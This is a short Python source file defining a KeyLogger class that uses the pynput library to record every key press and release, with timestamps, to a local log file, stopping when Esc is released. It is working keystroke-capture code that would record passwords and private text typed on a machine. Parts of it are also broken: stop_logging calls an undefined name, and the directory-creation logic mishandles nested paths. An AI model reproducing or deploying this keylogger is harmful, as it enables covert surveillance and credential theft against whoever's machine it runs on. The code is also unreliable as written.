# Libraries
import datetime
import os
from os import path as ospath
from pynput.keyboard import Key, Listener
import time

class Logger:
    """
    """
    def __init__(self, filename: str, time: callable=datetime.datetime.now, renew: bool=False):
        """
        """
        self.filename = filename
        self.time = time
        self.renew = renew

        self.init_file()

    def init_file(self):
        """
        """
        if "/" in self.filename: # if "/" in filename means that if it's a path

            path = self.filename.split("/") # Split the path by / to iterate through

            for e, i in enumerate(path): # Iterate through the directory
                
                if e == len(path) - 1: break # If we are in the last element when split("/"), which means the filename break because isn't a folder
                
                if not ospath.isdir(i): os.mkdir(i) # If isn't the filename (last element) create folder if it doesn't exist

        with open(self.filename, "a" if not self.renew else "w") as file: # Append to the file or overwrite the file with the time
            file.write(f"--- [{self.time()}] ---\n") # Write time func 

    def log(self, string: str):
        """
        """
        with open(self.filename, "a") as file: # Open file to append
            file.write(f"[{self.time()}] {string}\n") # Write the time func and the given text

class KeyLogger(Logger):
    """
    """
    def __init__(self, filename: str, time: callable=datetime.datetime.now, renew: bool=False):
        super().__init__(filename, time=time, renew=renew)

    def on_press(self, key, escape_key=None):
        self.log(f"Pressed {key}")

        if key == escape_key:
            print(f"{self} stopped with {key}")
            return False

    def on_release(self, key, escape_key=Key.esc):
        self.log(f"Released {key}")
        
        if key == escape_key:
            print(f"{self} stopped with {key}")
            return False

    def init_logging(self, on_press=None, on_release=None):
        on_press = self.on_press or on_press
        on_release = self.on_release or on_release

        with Listener(
                on_press=on_press,
                on_release=on_release) as listener:
            
            listener.join()

    def stop_logging(self):
        on_release(Key.esc)
